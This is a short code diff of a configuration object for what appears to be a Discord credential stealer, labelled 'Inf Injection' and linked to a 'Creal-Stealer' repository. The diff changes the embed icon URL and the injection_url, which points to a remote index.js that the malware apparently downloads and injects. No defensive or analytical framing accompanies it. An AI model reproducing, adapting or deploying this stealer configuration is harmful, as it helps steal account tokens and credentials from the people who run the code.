@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Inf Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://github-production-user-asset-6210df.s3.amazonaws.com/152412890/289637820-d64bf744-829f-48e5-846d-93d5a6468a36.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://github.com/12121212121QSDA/injection/blob/main/index.js', 
   /**
    
    **/
